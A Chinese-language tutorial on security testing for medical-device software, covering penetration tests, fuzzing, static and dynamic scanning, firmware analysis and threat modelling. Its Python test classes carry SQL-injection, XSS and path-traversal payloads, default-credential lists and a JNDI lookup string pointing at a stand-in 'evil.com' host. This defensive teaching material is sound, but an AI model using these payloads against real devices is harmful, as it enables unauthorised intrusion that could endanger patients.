---
title: 安全测试
difficulty: intermediate
estimated_time: 2-3小时
---

# 安全测试

## 学习目标

通过本文档的学习，你将能够：

- 理解核心概念和原理
- 掌握实际应用方法
- 了解最佳实践和注意事项

## 前置知识

在学习本文档之前，建议你已经掌握：

- 基础的嵌入式系统知识
- C/C++编程基础
- 相关领域的基本概念

## 概述

安全测试是识别和修复医疗设备软件安全漏洞的系统化过程。对于医疗设备，安全漏洞不仅可能导致数据泄露，还可能直接威胁患者安全。

## 为什么安全测试至关重要？

### 医疗设备面临的安全威胁

- **患者数据泄露**: 敏感健康信息被窃取
- **设备劫持**: 攻击者控制医疗设备
- **数据篡改**: 诊断结果或治疗参数被修改
- **拒绝服务**: 设备无法正常工作
- **勒索软件**: 医院系统被加密勒索

### 真实案例

- **2017年WannaCry**: 影响全球医疗机构，导致手术取消
- **心脏起搏器漏洞**: FDA召回46.5万台存在网络安全漏洞的设备
- **胰岛素泵漏洞**: 可被远程操控修改胰岛素剂量

### 监管要求

- **FDA网络安全指南**: 要求全面的安全测试和漏洞管理
- **MDR (EU 2017/745)**: 要求网络安全风险评估
- **HIPAA**: 要求保护患者健康信息
- **IEC 81001-5-1**: 医疗设备网络安全标准

## 安全测试类型

### 1. 渗透测试（Penetration Testing）

**目的**: 模拟真实攻击，发现可被利用的漏洞

**测试方法**:


**黑盒测试**: 不了解系统内部结构，模拟外部攻击者
**白盒测试**: 完全了解系统架构和源代码
**灰盒测试**: 部分了解系统信息

**渗透测试流程**:

```mermaid
graph LR
    A[信息收集] --> B[漏洞扫描]
    B --> C[漏洞验证]
    C --> D[漏洞利用]
    D --> E[权限提升]
    E --> F[横向移动]
    F --> G[报告编写]
```

**常见攻击向量**:

```python
# 示例：测试SQL注入漏洞
import requests

class SQLInjectionTest:
    def __init__(self, base_url):
        self.base_url = base_url
        self.vulnerabilities = []
    
    def test_sql_injection(self, endpoint, parameter):
        """测试SQL注入漏洞"""
        # SQL注入测试载荷
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]
        
        for payload in payloads:
            try:
                # 构造恶意请求
                params = {parameter: payload}
                response = requests.get(
                    f"{self.base_url}{endpoint}",
                    params=params,
                    timeout=5
                )
                
                # 检测漏洞特征
                if self.detect_sql_injection(response):
                    self.vulnerabilities.append({
                        'type': 'SQL Injection',
                        'endpoint': endpoint,
                        'parameter': parameter,
                        'payload': payload,
                        'severity': 'HIGH'
                    })
                    print(f"[!] 发现SQL注入漏洞: {endpoint}?{parameter}={payload}")
                    
            except Exception as e:
                print(f"测试出错: {e}")
    
    def detect_sql_injection(self, response):
        """检测SQL注入特征"""
        error_patterns = [
            "SQL syntax",
            "mysql_fetch",
            "ORA-",
            "PostgreSQL",
            "SQLite",
            "SQLSTATE"
        ]
        
        for pattern in error_patterns:
            if pattern.lower() in response.text.lower():
                return True
        return False

# 示例：测试XSS漏洞
class XSSTest:
    def __init__(self, base_url):
        self.base_url = base_url
    
    def test_reflected_xss(self, endpoint, parameter):
        """测试反射型XSS"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'>"
        ]
        
        for payload in payloads:
            params = {parameter: payload}
            response = requests.get(
                f"{self.base_url}{endpoint}",
                params=params
            )
            
            # 检查payload是否未经过滤直接返回
            if payload in response.text:
                print(f"[!] 发现XSS漏洞: {endpoint}?{parameter}={payload}")
                return True
        return False

# 示例：测试认证绕过
class AuthenticationTest:
    def test_broken_authentication(self, login_url):
        """测试认证漏洞"""
        # 测试弱密码
        weak_passwords = ['admin', '123456', 'password', 'admin123']
        
        for password in weak_passwords:
            response = requests.post(login_url, data={
                'username': 'admin',
                'password': password
            })
            
            if response.status_code == 200 and 'dashboard' in response.url:
                print(f"[!] 发现弱密码: admin/{password}")
        
        # 测试会话固定
        session = requests.Session()
        response1 = session.get(login_url)
        session_id_before = session.cookies.get('SESSIONID')
        
        # 登录
        session.post(login_url, data={
            'username': 'testuser',
            'password': 'testpass'
        })
        
        session_id_after = session.cookies.get('SESSIONID')
        
        if session_id_before == session_id_after:
            print("[!] 发现会话固定漏洞")
```

**医疗设备特定测试**:

```python
class MedicalDeviceSecurityTest:
    """医疗设备安全测试"""
    
    def test_device_authentication(self, device_ip):
        """测试设备认证机制"""
        # 测试默认凭据
        default_credentials = [
            ('admin', 'admin'),
            ('root', 'root'),
            ('service', 'service'),
            ('admin', '1234')
        ]
        
        for username, password in default_credentials:
            if self.try_login(device_ip, username, password):
                print(f"[!] 设备使用默认凭据: {username}/{password}")
    
    def test_firmware_security(self, firmware_file):
        """测试固件安全性"""
        # 检查硬编码密钥
        with open(firmware_file, 'rb') as f:
            content = f.read()
            
            # 搜索常见密钥模式
            patterns = [
                b'-----BEGIN PRIVATE KEY-----',
                b'api_key',
                b'password',
                b'secret'
            ]
            
            for pattern in patterns:
                if pattern in content:
                    print(f"[!] 固件中发现敏感信息: {pattern}")
    
    def test_communication_security(self, device_ip, port):
        """测试通信安全"""
        import ssl
        import socket
        
        # 测试是否使用加密通信
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((device_ip, port))
            
            # 尝试SSL/TLS握手
            context = ssl.create_default_context()
            ssl_sock = context.wrap_socket(sock, server_hostname=device_ip)
            
            # 检查证书
            cert = ssl_sock.getpeercert()
            print(f"[+] 使用加密通信，证书: {cert}")
            
        except ssl.SSLError:
            print("[!] 未使用加密通信或证书无效")
        except Exception as e:
            print(f"[!] 通信测试失败: {e}")
```


### 2. 模糊测试（Fuzzing）

**目的**: 通过输入大量随机或畸形数据发现程序崩溃和漏洞

**模糊测试类型**:
- **变异模糊测试**: 修改有效输入生成测试用例
- **生成模糊测试**: 基于协议规范生成测试用例
- **覆盖引导模糊测试**: 基于代码覆盖率优化测试

**工具和示例**:

```python
# 使用AFL (American Fuzzy Lop) 进行模糊测试
# 编译目标程序
# $ afl-gcc -o medical_parser medical_parser.c

# 运行AFL
# $ afl-fuzz -i input_dir -o output_dir ./medical_parser @@

# Python模糊测试示例
import random
import string

class HL7Fuzzer:
    """HL7消息模糊测试器"""
    
    def __init__(self):
        self.segment_types = ['MSH', 'PID', 'OBR', 'OBX']
    
    def generate_valid_hl7(self):
        """生成有效的HL7消息"""
        msg = "MSH|^~\\&|SENDING_APP|SENDING_FAC|RECV_APP|RECV_FAC|20240115120000||ADT^A01|MSG001|P|2.5\r"
        msg += "PID|1||12345||DOE^JOHN||19800101|M\r"
        return msg
    
    def mutate_hl7(self, message):
        """变异HL7消息"""
        mutations = [
            self.mutate_field_separator,
            self.mutate_segment_order,
            self.mutate_field_length,
            self.mutate_special_chars,
            self.mutate_encoding
        ]
        
        mutator = random.choice(mutations)
        return mutator(message)
    
    def mutate_field_separator(self, message):
        """修改字段分隔符"""
        return message.replace('|', random.choice(['||', '', '\x00', '\xff']))
    
    def mutate_field_length(self, message):
        """修改字段长度"""
        lines = message.split('\r')
        if lines:
            line = random.choice(lines)
            # 插入超长字段
            long_field = 'A' * random.randint(1000, 10000)
            return message.replace(line, line + '|' + long_field)
        return message
    
    def mutate_special_chars(self, message):
        """插入特殊字符"""
        special_chars = ['\x00', '\xff', '\n', '\r\n', '<', '>', '&', '"', "'"]
        pos = random.randint(0, len(message))
        char = random.choice(special_chars)
        return message[:pos] + char + message[pos:]
    
    def fuzz_test(self, target_function, iterations=1000):
        """执行模糊测试"""
        crashes = []
        
        for i in range(iterations):
            # 生成测试用例
            base_msg = self.generate_valid_hl7()
            fuzzed_msg = self.mutate_hl7(base_msg)
            
            try:
                # 测试目标函数
                result = target_function(fuzzed_msg)
            except Exception as e:
                # 记录崩溃
                crashes.append({
                    'iteration': i,
                    'input': fuzzed_msg,
                    'exception': str(e)
                })
                print(f"[!] 发现崩溃 #{len(crashes)}: {e}")
        
        return crashes

# DICOM文件模糊测试
class DICOMFuzzer:
    """DICOM文件模糊测试器"""
    
    def fuzz_dicom_file(self, input_file, output_file):
        """对DICOM文件进行模糊测试"""
        with open(input_file, 'rb') as f:
            data = bytearray(f.read())
        
        # 随机修改字节
        num_mutations = random.randint(1, 10)
        for _ in range(num_mutations):
            pos = random.randint(0, len(data) - 1)
            data[pos] = random.randint(0, 255)
        
        with open(output_file, 'wb') as f:
            f.write(data)
    
    def test_dicom_parser(self, parser_function, num_tests=100):
        """测试DICOM解析器"""
        for i in range(num_tests):
            fuzzed_file = f"fuzzed_{i}.dcm"
            self.fuzz_dicom_file("valid_sample.dcm", fuzzed_file)
            
            try:
                parser_function(fuzzed_file)
            except Exception as e:
                print(f"[!] 解析器崩溃: {e}")
```

**使用libFuzzer进行C/C++模糊测试**:

```cpp
// medical_device_fuzzer.cpp
#include <stdint.h>
#include <stddef.h>
#include <string>

// 要测试的函数
extern "C" int parse_patient_data(const uint8_t* data, size_t size);

// libFuzzer入口点
extern "C" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {
    // 调用目标函数
    parse_patient_data(data, size);
    return 0;
}

// 编译命令:
// clang++ -g -O1 -fsanitize=fuzzer,address medical_device_fuzzer.cpp -o fuzzer
// 运行: ./fuzzer
```

### 3. 静态应用安全测试（SAST）

**目的**: 在不运行程序的情况下分析源代码发现安全漏洞

**SAST工具**:

| 工具 | 语言支持 | 类型 | 特点 |
|------|---------|------|------|
| **SonarQube** | 多语言 | 开源/商业 | 持续集成友好 |
| **Checkmarx** | 多语言 | 商业 | 企业级 |
| **Fortify** | 多语言 | 商业 | 深度分析 |
| **Bandit** | Python | 开源 | 轻量级 |
| **Cppcheck** | C/C++ | 开源 | 专注C/C++ |

**使用Bandit进行Python代码安全扫描**:

```bash
# 安装Bandit
pip install bandit

# 扫描单个文件
bandit medical_device.py

# 扫描整个项目
bandit -r ./src -f json -o security_report.json

# 排除测试文件
bandit -r ./src -x ./src/tests
```

**Bandit配置文件**:

```yaml
# .bandit
exclude_dirs:
  - /tests
  - /venv

tests:
  - B201  # flask_debug_true
  - B301  # pickle
  - B302  # marshal
  - B303  # md5
  - B304  # ciphers
  - B305  # cipher_modes
  - B306  # mktemp_q
  - B307  # eval
  - B308  # mark_safe
  - B309  # httpsconnection
  - B310  # urllib_urlopen
  - B311  # random
  - B312  # telnetlib
  - B313  # xml_bad_cElementTree
  - B314  # xml_bad_ElementTree
  - B315  # xml_bad_expatreader
  - B316  # xml_bad_expatbuilder
  - B317  # xml_bad_sax
  - B318  # xml_bad_minidom
  - B319  # xml_bad_pulldom
  - B320  # xml_bad_etree
  - B321  # ftplib
  - B322  # input
  - B323  # unverified_context
  - B324  # hashlib
  - B325  # tempnam
  - B401  # import_telnetlib
  - B402  # import_ftplib
  - B403  # import_pickle
  - B404  # import_subprocess
  - B405  # import_xml_etree
  - B406  # import_xml_sax
  - B407  # import_xml_expat
  - B408  # import_xml_minidom
  - B409  # import_xml_pulldom
  - B410  # import_lxml
  - B411  # import_xmlrpclib
  - B412  # import_httpoxy
  - B413  # import_pycrypto
  - B501  # request_with_no_cert_validation
  - B502  # ssl_with_bad_version
  - B503  # ssl_with_bad_defaults
  - B504  # ssl_with_no_version
  - B505  # weak_cryptographic_key
  - B506  # yaml_load
  - B507  # ssh_no_host_key_verification
  - B601  # paramiko_calls
  - B602  # shell_injection
  - B603  # subprocess_without_shell_equals_true
  - B604  # any_other_function_with_shell_equals_true
  - B605  # start_process_with_a_shell
  - B606  # start_process_with_no_shell
  - B607  # start_process_with_partial_path
  - B608  # hardcoded_sql_expressions
  - B609  # linux_commands_wildcard_injection
  - B610  # django_extra_used
  - B611  # django_rawsql_used
  - B701  # jinja2_autoescape_false
  - B702  # use_of_mako_templates
  - B703  # django_mark_safe
```


**SonarQube集成**:

```yaml
# sonar-project.properties
sonar.projectKey=medical-device-software
sonar.projectName=Medical Device Software
sonar.projectVersion=1.0
sonar.sources=src
sonar.tests=tests
sonar.python.coverage.reportPaths=coverage.xml
sonar.python.bandit.reportPaths=bandit-report.json

# 运行SonarQube扫描
# sonar-scanner
```

**自定义安全规则**:

```python
# custom_security_checks.py
import ast

class MedicalDeviceSecurityChecker(ast.NodeVisitor):
    """自定义医疗设备安全检查器"""
    
    def __init__(self):
        self.issues = []
    
    def visit_Call(self, node):
        """检查函数调用"""
        # 检查是否使用了不安全的函数
        if isinstance(node.func, ast.Name):
            if node.func.id in ['eval', 'exec', 'compile']:
                self.issues.append({
                    'type': 'DANGEROUS_FUNCTION',
                    'line': node.lineno,
                    'message': f'使用了危险函数: {node.func.id}'
                })
        
        # 检查是否使用了弱加密算法
        if isinstance(node.func, ast.Attribute):
            if node.func.attr in ['md5', 'sha1']:
                self.issues.append({
                    'type': 'WEAK_CRYPTO',
                    'line': node.lineno,
                    'message': f'使用了弱加密算法: {node.func.attr}'
                })
        
        self.generic_visit(node)
    
    def visit_Str(self, node):
        """检查字符串常量"""
        # 检查硬编码密码
        if any(keyword in node.s.lower() for keyword in ['password', 'secret', 'api_key']):
            if '=' in node.s or ':' in node.s:
                self.issues.append({
                    'type': 'HARDCODED_SECRET',
                    'line': node.lineno,
                    'message': '可能存在硬编码的密钥或密码'
                })
        
        self.generic_visit(node)

def check_file_security(filename):
    """检查文件安全性"""
    with open(filename, 'r') as f:
        tree = ast.parse(f.read())
    
    checker = MedicalDeviceSecurityChecker()
    checker.visit(tree)
    
    return checker.issues
```

### 4. 动态应用安全测试（DAST）

**目的**: 在运行时测试应用程序，发现运行时漏洞

**DAST工具**:

| 工具 | 类型 | 适用场景 | 特点 |
|------|------|---------|------|
| **OWASP ZAP** | 开源 | Web应用 | 功能全面、易用 |
| **Burp Suite** | 商业 | Web应用 | 专业级、插件丰富 |
| **Acunetix** | 商业 | Web应用 | 自动化程度高 |
| **Nessus** | 商业 | 网络/系统 | 漏洞扫描 |

**使用OWASP ZAP进行自动化扫描**:

```python
from zapv2 import ZAPv2
import time

class ZAPScanner:
    """OWASP ZAP自动化扫描器"""
    
    def __init__(self, zap_proxy='http://localhost:8080'):
        self.zap = ZAPv2(proxies={'http': zap_proxy, 'https': zap_proxy})
    
    def scan_target(self, target_url):
        """扫描目标应用"""
        print(f"[*] 开始扫描: {target_url}")
        
        # 1. 访问目标URL
        print("[*] 爬取网站...")
        self.zap.urlopen(target_url)
        time.sleep(2)
        
        # 2. 蜘蛛爬取
        scan_id = self.zap.spider.scan(target_url)
        while int(self.zap.spider.status(scan_id)) < 100:
            print(f"[*] 爬取进度: {self.zap.spider.status(scan_id)}%")
            time.sleep(5)
        
        print("[+] 爬取完成")
        
        # 3. 主动扫描
        print("[*] 开始主动扫描...")
        scan_id = self.zap.ascan.scan(target_url)
        while int(self.zap.ascan.status(scan_id)) < 100:
            print(f"[*] 扫描进度: {self.zap.ascan.status(scan_id)}%")
            time.sleep(10)
        
        print("[+] 扫描完成")
        
        # 4. 获取结果
        alerts = self.zap.core.alerts(baseurl=target_url)
        return self.process_alerts(alerts)
    
    def process_alerts(self, alerts):
        """处理扫描结果"""
        vulnerabilities = {
            'high': [],
            'medium': [],
            'low': [],
            'informational': []
        }
        
        for alert in alerts:
            risk = alert['risk'].lower()
            vuln = {
                'name': alert['alert'],
                'url': alert['url'],
                'description': alert['description'],
                'solution': alert['solution'],
                'cwe_id': alert.get('cweid', 'N/A'),
                'wasc_id': alert.get('wascid', 'N/A')
            }
            
            if risk in vulnerabilities:
                vulnerabilities[risk].append(vuln)
        
        return vulnerabilities
    
    def generate_report(self, vulnerabilities, output_file='security_report.html'):
        """生成安全报告"""
        html_report = self.zap.core.htmlreport()
        with open(output_file, 'w') as f:
            f.write(html_report)
        
        print(f"[+] 报告已生成: {output_file}")
        
        # 打印摘要
        print("\n=== 漏洞摘要 ===")
        print(f"高危: {len(vulnerabilities['high'])}")
        print(f"中危: {len(vulnerabilities['medium'])}")
        print(f"低危: {len(vulnerabilities['low'])}")
        print(f"信息: {len(vulnerabilities['informational'])}")

# 使用示例
scanner = ZAPScanner()
results = scanner.scan_target('https://medical-device.example.com')
scanner.generate_report(results)
```

**API安全测试**:

```python
import requests
import json

class APISecurityTest:
    """API安全测试"""
    
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def test_authentication(self):
        """测试认证机制"""
        # 测试无认证访问
        response = self.session.get(f"{self.base_url}/api/patients")
        if response.status_code == 200:
            print("[!] API允许未认证访问")
        
        # 测试弱令牌
        weak_tokens = ['admin', '123456', 'token', 'test']
        for token in weak_tokens:
            headers = {'Authorization': f'Bearer {token}'}
            response = self.session.get(
                f"{self.base_url}/api/patients",
                headers=headers
            )
            if response.status_code == 200:
                print(f"[!] 发现弱令牌: {token}")
    
    def test_authorization(self):
        """测试授权机制"""
        # 测试水平越权
        patient_ids = ['12345', '12346', '12347']
        
        for patient_id in patient_ids:
            response = self.session.get(
                f"{self.base_url}/api/patients/{patient_id}"
            )
            if response.status_code == 200:
                print(f"[!] 可能存在水平越权: 访问患者{patient_id}")
    
    def test_input_validation(self):
        """测试输入验证"""
        # 测试超长输入
        long_input = 'A' * 10000
        response = self.session.post(
            f"{self.base_url}/api/patients",
            json={'name': long_input}
        )
        
        # 测试特殊字符
        special_inputs = [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE patients; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for input_data in special_inputs:
            response = self.session.post(
                f"{self.base_url}/api/patients",
                json={'name': input_data}
            )
            if input_data in response.text:
                print(f"[!] 输入未经过滤: {input_data}")
    
    def test_rate_limiting(self):
        """测试速率限制"""
        # 发送大量请求
        for i in range(1000):
            response = self.session.get(f"{self.base_url}/api/patients")
            if response.status_code != 429:  # Too Many Requests
                if i > 100:
                    print("[!] 未实施速率限制")
                    break
```


## 医疗设备特定安全测试

### 1. 设备通信安全

```python
import socket
import ssl
from cryptography import x509
from cryptography.hazmat.backends import default_backend

class DeviceCommunicationTest:
    """设备通信安全测试"""
    
    def test_encryption(self, device_ip, port):
        """测试通信加密"""
        try:
            # 创建socket连接
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((device_ip, port))
            
            # 尝试TLS握手
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            ssl_sock = context.wrap_socket(sock, server_hostname=device_ip)
            
            # 获取证书信息
            cert_bin = ssl_sock.getpeercert(binary_form=True)
            cert = x509.load_der_x509_certificate(cert_bin, default_backend())
            
            print(f"[+] 使用TLS加密")
            print(f"    协议版本: {ssl_sock.version()}")
            print(f"    密码套件: {ssl_sock.cipher()}")
            print(f"    证书主题: {cert.subject}")
            print(f"    证书有效期: {cert.not_valid_before} - {cert.not_valid_after}")
            
            # 检查证书有效性
            from datetime import datetime
            now = datetime.now()
            if now < cert.not_valid_before or now > cert.not_valid_after:
                print("[!] 证书已过期或尚未生效")
            
            ssl_sock.close()
            
        except ssl.SSLError as e:
            print(f"[!] TLS握手失败: {e}")
            print("[!] 设备可能未使用加密通信")
        except Exception as e:
            print(f"[!] 连接失败: {e}")
    
    def test_protocol_security(self, device_ip, port):
        """测试协议安全性"""
        # 测试是否支持弱协议版本
        weak_protocols = [
            ssl.PROTOCOL_SSLv2,
            ssl.PROTOCOL_SSLv3,
            ssl.PROTOCOL_TLSv1,
            ssl.PROTOCOL_TLSv1_1
        ]
        
        for protocol in weak_protocols:
            try:
                context = ssl.SSLContext(protocol)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ssl_sock = context.wrap_socket(sock)
                ssl_sock.connect((device_ip, port))
                print(f"[!] 支持弱协议: {protocol}")
                ssl_sock.close()
            except:
                pass

### 2. 固件安全分析

```python
import binwalk
import hashlib
import os

class FirmwareSecurityAnalysis:
    """固件安全分析"""
    
    def analyze_firmware(self, firmware_path):
        """分析固件文件"""
        print(f"[*] 分析固件: {firmware_path}")
        
        # 1. 计算哈希值
        file_hash = self.calculate_hash(firmware_path)
        print(f"[+] SHA256: {file_hash}")
        
        # 2. 提取固件内容
        self.extract_firmware(firmware_path)
        
        # 3. 搜索敏感信息
        self.search_secrets(firmware_path)
        
        # 4. 检查已知漏洞
        self.check_vulnerabilities(firmware_path)
    
    def calculate_hash(self, file_path):
        """计算文件哈希"""
        sha256_hash = hashlib.sha256()
        with open(file_path, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()
    
    def extract_firmware(self, firmware_path):
        """提取固件内容"""
        print("[*] 提取固件内容...")
        # 使用binwalk提取
        os.system(f"binwalk -e {firmware_path}")
    
    def search_secrets(self, firmware_path):
        """搜索敏感信息"""
        print("[*] 搜索敏感信息...")
        
        patterns = {
            'private_key': rb'-----BEGIN.*PRIVATE KEY-----',
            'password': rb'password\s*=\s*["\']([^"\']+)["\']',
            'api_key': rb'api[_-]?key\s*=\s*["\']([^"\']+)["\']',
            'secret': rb'secret\s*=\s*["\']([^"\']+)["\']',
            'token': rb'token\s*=\s*["\']([^"\']+)["\']'
        }
        
        with open(firmware_path, 'rb') as f:
            content = f.read()
            
            for name, pattern in patterns.items():
                import re
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    print(f"[!] 发现{name}: {len(matches)}个")
    
    def check_vulnerabilities(self, firmware_path):
        """检查已知漏洞"""
        print("[*] 检查已知漏洞...")
        
        # 检查常见漏洞库版本
        vulnerable_libs = {
            'openssl-1.0.1': 'Heartbleed (CVE-2014-0160)',
            'libssh-0.7': 'Authentication bypass (CVE-2018-10933)',
            'busybox-1.29': 'Multiple vulnerabilities'
        }
        
        with open(firmware_path, 'rb') as f:
            content = f.read().decode('latin-1')
            
            for lib, vuln in vulnerable_libs.items():
                if lib in content:
                    print(f"[!] 发现易受攻击的库: {lib} - {vuln}")
```

### 3. 数据安全测试

```python
import sqlite3
import json

class DataSecurityTest:
    """数据安全测试"""
    
    def test_data_encryption(self, db_path):
        """测试数据加密"""
        print("[*] 检查数据库加密...")
        
        try:
            # 尝试直接打开数据库
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # 查询患者数据
            cursor.execute("SELECT * FROM patients LIMIT 1")
            row = cursor.fetchone()
            
            if row:
                print("[!] 数据库未加密，可直接读取敏感数据")
                print(f"    示例数据: {row}")
            
            conn.close()
            
        except sqlite3.DatabaseError:
            print("[+] 数据库可能已加密")
    
    def test_data_sanitization(self, log_file):
        """测试数据脱敏"""
        print("[*] 检查日志文件中的敏感信息...")
        
        sensitive_patterns = [
            r'\d{3}-\d{2}-\d{4}',  # SSN
            r'\d{16}',  # 信用卡号
            r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',  # Email
            r'\d{3}-\d{3}-\d{4}'  # 电话号码
        ]
        
        import re
        with open(log_file, 'r') as f:
            content = f.read()
            
            for pattern in sensitive_patterns:
                matches = re.findall(pattern, content)
                if matches:
                    print(f"[!] 日志中发现敏感信息: {pattern}")
                    print(f"    示例: {matches[0]}")
    
    def test_backup_security(self, backup_path):
        """测试备份安全性"""
        print("[*] 检查备份文件安全...")
        
        # 检查文件权限
        import stat
        file_stat = os.stat(backup_path)
        mode = file_stat.st_mode
        
        if mode & stat.S_IROTH or mode & stat.S_IWOTH:
            print("[!] 备份文件权限过于宽松")
        
        # 检查是否加密
        with open(backup_path, 'rb') as f:
            header = f.read(16)
            # 检查常见加密文件头
            if not (header.startswith(b'Salted__') or  # OpenSSL
                    header.startswith(b'PGP') or  # PGP
                    header.startswith(b'\x50\x4b')):  # ZIP加密
                print("[!] 备份文件可能未加密")
```

## 安全测试工具链

### 完整的安全测试流程

```python
class MedicalDeviceSecurityTestSuite:
    """医疗设备安全测试套件"""
    
    def __init__(self, target_config):
        self.target = target_config
        self.results = {
            'sast': [],
            'dast': [],
            'penetration': [],
            'fuzzing': [],
            'firmware': []
        }
    
    def run_full_security_test(self):
        """运行完整安全测试"""
        print("=" * 60)
        print("医疗设备安全测试套件")
        print("=" * 60)
        
        # 1. 静态分析
        print("\n[1/5] 运行静态代码分析...")
        self.run_sast()
        
        # 2. 动态分析
        print("\n[2/5] 运行动态应用测试...")
        self.run_dast()
        
        # 3. 渗透测试
        print("\n[3/5] 运行渗透测试...")
        self.run_penetration_test()
        
        # 4. 模糊测试
        print("\n[4/5] 运行模糊测试...")
        self.run_fuzzing()
        
        # 5. 固件分析
        if self.target.get('firmware_path'):
            print("\n[5/5] 运行固件分析...")
            self.run_firmware_analysis()
        
        # 生成报告
        self.generate_comprehensive_report()
    
    def run_sast(self):
        """运行SAST"""
        # Bandit扫描
        os.system(f"bandit -r {self.target['source_path']} -f json -o sast_report.json")
        
        # SonarQube扫描
        os.system("sonar-scanner")
    
    def run_dast(self):
        """运行DAST"""
        if self.target.get('web_url'):
            scanner = ZAPScanner()
            results = scanner.scan_target(self.target['web_url'])
            self.results['dast'] = results
    
    def run_penetration_test(self):
        """运行渗透测试"""
        # SQL注入测试
        sql_test = SQLInjectionTest(self.target['web_url'])
        sql_test.test_sql_injection('/api/patients', 'id')
        
        # XSS测试
        xss_test = XSSTest(self.target['web_url'])
        xss_test.test_reflected_xss('/search', 'q')
        
        # 认证测试
        auth_test = AuthenticationTest()
        auth_test.test_broken_authentication(f"{self.target['web_url']}/login")
    
    def run_fuzzing(self):
        """运行模糊测试"""
        if self.target.get('hl7_endpoint'):
            fuzzer = HL7Fuzzer()
            crashes = fuzzer.fuzz_test(
                self.target['hl7_parser'],
                iterations=10000
            )
            self.results['fuzzing'] = crashes
    
    def run_firmware_analysis(self):
        """运行固件分析"""
        analyzer = FirmwareSecurityAnalysis()
        analyzer.analyze_firmware(self.target['firmware_path'])
    
    def generate_comprehensive_report(self):
        """生成综合报告"""
        report = {
            'test_date': datetime.now().isoformat(),
            'target': self.target,
            'results': self.results,
            'summary': self.calculate_summary()
        }
        
        with open('security_test_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print("\n" + "=" * 60)
        print("测试完成！报告已生成: security_test_report.json")
        print("=" * 60)
        self.print_summary()
    
    def calculate_summary(self):
        """计算测试摘要"""
        total_issues = 0
        critical = 0
        high = 0
        medium = 0
        low = 0
        
        # 统计各类问题
        for category, issues in self.results.items():
            if isinstance(issues, list):
                total_issues += len(issues)
        
        return {
            'total_issues': total_issues,
            'critical': critical,
            'high': high,
            'medium': medium,
            'low': low
        }
    
    def print_summary(self):
        """打印测试摘要"""
        summary = self.calculate_summary()
        print(f"\n发现问题总数: {summary['total_issues']}")
        print(f"  严重: {summary['critical']}")
        print(f"  高危: {summary['high']}")
        print(f"  中危: {summary['medium']}")
        print(f"  低危: {summary['low']}")
```


## 安全测试最佳实践

### 1. 威胁建模

在测试前进行威胁建模，识别潜在攻击面：

```markdown
# 威胁建模 - 心电监护系统

## 资产识别
- 患者生理数据（ECG、血压、心率等）
- 患者个人信息（姓名、病历号等）
- 设备配置和参数
- 医护人员凭据

## 威胁识别（STRIDE模型）

### Spoofing（欺骗）
- 攻击者伪装成合法医护人员
- 伪造设备身份

### Tampering（篡改）
- 修改患者数据
- 篡改设备参数
- 修改警报阈值

### Repudiation（否认）
- 操作无法追溯
- 缺少审计日志

### Information Disclosure（信息泄露）
- 未加密的数据传输
- 日志中的敏感信息
- 数据库未加密

### Denial of Service（拒绝服务）
- 网络攻击导致设备离线
- 资源耗尽攻击

### Elevation of Privilege（权限提升）
- 普通用户获取管理员权限
- 绕过访问控制

## 风险评估

| 威胁 | 可能性 | 影响 | 风险等级 | 缓解措施 |
|------|--------|------|---------|---------|
| 数据篡改 | 中 | 高 | 高 | 数据完整性校验、数字签名 |
| 信息泄露 | 高 | 高 | 高 | 端到端加密、访问控制 |
| 拒绝服务 | 中 | 中 | 中 | 速率限制、冗余设计 |
| 权限提升 | 低 | 高 | 中 | 最小权限原则、多因素认证 |
```

### 2. 安全测试检查清单

```markdown
# 医疗设备安全测试检查清单

## 认证和授权
- [ ] 强密码策略
- [ ] 多因素认证
- [ ] 会话管理安全
- [ ] 密码存储加密
- [ ] 账户锁定机制
- [ ] 权限最小化
- [ ] 角色基础访问控制（RBAC）

## 数据保护
- [ ] 传输加密（TLS 1.2+）
- [ ] 存储加密
- [ ] 数据完整性校验
- [ ] 敏感数据脱敏
- [ ] 安全的数据删除
- [ ] 备份加密

## 输入验证
- [ ] SQL注入防护
- [ ] XSS防护
- [ ] CSRF防护
- [ ] 命令注入防护
- [ ] 路径遍历防护
- [ ] XML/JSON注入防护

## 通信安全
- [ ] 使用强加密算法
- [ ] 证书验证
- [ ] 禁用弱协议（SSLv2/v3, TLS 1.0/1.1）
- [ ] 安全的密钥管理
- [ ] 防重放攻击

## 日志和监控
- [ ] 安全事件日志
- [ ] 审计跟踪
- [ ] 异常检测
- [ ] 日志保护
- [ ] 日志不包含敏感信息

## 配置安全
- [ ] 移除默认凭据
- [ ] 禁用不必要的服务
- [ ] 安全的默认配置
- [ ] 定期安全更新
- [ ] 安全的错误处理

## 代码安全
- [ ] 无硬编码密钥
- [ ] 安全的随机数生成
- [ ] 避免使用危险函数
- [ ] 内存安全
- [ ] 整数溢出防护
```

### 3. 持续安全测试

将安全测试集成到CI/CD流程：

```yaml
# .gitlab-ci.yml
stages:
  - build
  - test
  - security
  - deploy

# SAST扫描
sast:
  stage: security
  script:
    - bandit -r src/ -f json -o bandit-report.json
    - sonar-scanner
  artifacts:
    reports:
      sast: bandit-report.json

# 依赖扫描
dependency_scanning:
  stage: security
  script:
    - safety check --json > safety-report.json
    - npm audit --json > npm-audit.json
  artifacts:
    reports:
      dependency_scanning: safety-report.json

